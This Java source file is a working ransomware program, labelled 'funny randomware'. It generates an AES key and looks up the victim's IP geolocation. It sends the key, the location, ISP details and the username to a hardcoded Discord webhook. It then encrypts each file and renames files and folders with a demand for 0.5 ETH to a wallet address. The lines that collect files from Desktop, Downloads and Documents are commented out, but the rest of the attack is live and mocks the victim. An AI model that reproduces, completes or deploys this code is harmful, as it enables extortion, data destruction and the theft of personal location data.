import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import javax.swing.*;
import java.awt.*;
import java.io.*;
import java.lang.reflect.Array;
import java.math.BigDecimal;
import java.net.MalformedURLException;
import java.net.URL;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.Base64;
import java.util.Scanner;
import com.google.gson.Gson;
import org.json.JSONException;
import org.json.JSONObject;


public class Main {
    public static ArrayList<File> realF = new ArrayList<>();
    public static ArrayList<File> dirs = new ArrayList<>();

    public static void main(String[] args) throws MalformedURLException {
        /*
        DO NOT
        UNCOMMENT THIS

        DO NOT
        UNCOMMENT THIS

        DO NOT
        UNCOMMENT THIS

        File des = new File(System.getProperty("user.home") + "/Desktop");
        File dow = new File(System.getProperty("user.home") + "/Downloads");
        File doc = new File(System.getProperty("user.home") + "/Documents");
        getFiles(des);
        getFiles(dow);
        getFiles(doc);

        */

        /*for (File f : realF) {
            System.out.println(f.toString());
        }
        for (File f : dirs) {
            System.out.println(f.toString());
        }
        */

        System.out.println(realF.size() + " Files Detected");

        System.out.println(dirs.size() + " Directories Detected");


        try {
            SecretKey key = Encrypt.genKey(256);
            String strKey = Base64.getEncoder().encodeToString(key.getEncoded());
            IvParameterSpec iv = Encrypt.generateIv();
            JSONObject json = new JSONObject(getJSON(new URL("http://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,isp,org,as,asname,reverse,mobile,proxy,hosting,query")));
            DiscordWebhook LMAO = new DiscordWebhook("https://discord.com/api/webhooks/1024833564971384912/pVMr8ShCNE4hOBhLvhHsH3qshaga8l4-rnlnGEGMRVwpaFZSgHNm9qf_0KOz6Q4ydw5g");
            LMAO.setUsername(System.getProperty("idiot finder v2"));
            LMAO.setAvatarUrl("https://i.kym-cdn.com/entries/icons/square/000/021/703/smiley-face-thumbs-up-thank-you-clipart-panda-free-clipart-images-4eZHzt-clipart.jpeg");
            LMAO.addEmbed(new DiscordWebhook.EmbedObject()
                    .setTitle(System.getProperty("user.name") + " is an idiot lmao")
                    .setDescription("funny randomware 1.0.0")
                    .setColor(Color.GREEN)
                    .addField("Encryption Type", key.getAlgorithm(), false)
                    .addField("SecretKey", Base64.getEncoder().encodeToString(key.getEncoded()), true)
                    .addField("IvParameterSpec", "CBC Encrypted", true)
                    .addField("Ip", json.getString("query"), true)
                    .addField("Zip", json.getString("zip"), true)
                    .addField("Latitude", json.getBigDecimal("lat").toString(), true)
                    .addField("Longitude", json.getBigDecimal("lon").toString(), true)
                    .setImage("https://media.istockphoto.com/photos/asian-emoji-with-conical-straw-hat-isolated-on-white-background-picture-id961331086?k=20&m=961331086&s=170667a&w=0&h=Fy2TU1TWJADmIZh-pKdjNNh8pVs6dOR2cziNNrlhHJA="));
            LMAO.addEmbed(new DiscordWebhook.EmbedObject()
                    .setTitle("rip bozo")
                    .setDescription(System.getProperty("user.name") + "'s Network Information?!21?#!@?$!@*^")
                    .setColor(Color.RED)
                    .addField("Country",json.getString("country"),true)
                    .addField("Region",json.getString("regionName"),true)
                    .addField("City",json.getString("city"),true)
                    .addField("Isp",json.getString("isp"),true)
                    .addField("org",json.getString("org"),true)
                    .addField("as",json.getString("as"),true)
                    .addField("asname",json.getString("asname"),true)
                    .addField("Reverse DNS",json.getString("reverse"),true)
                    .addField("Hotspot",Boolean.toString(json.getBoolean("mobile")),true)
                    .addField("Proxy",Boolean.toString(json.getBoolean("proxy")),true)
                    .addField("Hosting",Boolean.toString(json.getBoolean("hosting")),true)
                    .addField("Ip",json.getString("query"),true)
                    .setImage("https://w7.pngwing.com/pngs/760/848/png-transparent-smiley-computer-icons-desktop-emoji-vkontakte-3d-miscellaneous-3d-emoticon.png")

            );
            LMAO.execute();
            //here comes the funny part
            for(File f : realF) {
                encryptFile(f,key);
            }
            for(File f : dirs) {
                f.renameTo(new File(f+" SEND 0.5 ETH TO 0xfb27bdE6EA0B7Dac4031A7B0ABA155E256150C1a TO GET YOUR FILES DECRYPTED"));
            }
        }catch(Exception e) {
            e.printStackTrace();
        }
    }

    public static void encryptFile(File f, SecretKey key) throws IOException, InvalidAlgorithmParameterException, NoSuchPaddingException, IllegalBlockSizeException, NoSuchAlgorithmException, BadPaddingException, InvalidKeyException {
        Scanner sc = new Scanner(f);
        ArrayList<String> data = new ArrayList<>();
        ArrayList<String> encdata = new ArrayList<>();
        ArrayList<String> decdata = new ArrayList<>();
        while (sc.hasNextLine()) {
            data.add(sc.nextLine());
        }
        for (String s : data) {
            encdata.add(Encrypt.encryptCBC("AES/CBC/PKCS5PADDING", s, key));
        }
        new FileOutputStream(f).close();
        FileWriter wr = new FileWriter(f);
        for (String s : encdata) {
            wr.write(s);
        }
        wr.close();

        f.renameTo(new File(f+" SEND 0.5 ETH TO 0xfb27bdE6EA0B7Dac4031A7B0ABA155E256150C1a TO GET YOUR FILES DECRYPTED"));
    }

    public static void getFiles(File f) {
        File[] flist = f.listFiles();
        for (File fi : flist) {
            if (fi.isDirectory()) {
                dirs.add(fi);
                getFiles(fi);
            } else {
                realF.add(fi);
            }
        }
    }

    public static String getJSON(URL url) {
        try (InputStream input = url.openStream()) {
            InputStreamReader isr = new InputStreamReader(input);
            BufferedReader reader = new BufferedReader(isr);
            StringBuilder json = new StringBuilder();
            int c;
            while ((c = reader.read()) != -1) {
                json.append((char) c);
            }
            return json.toString();
        } catch(IOException e) {
            throw new RuntimeException(e);
        }
    }
}
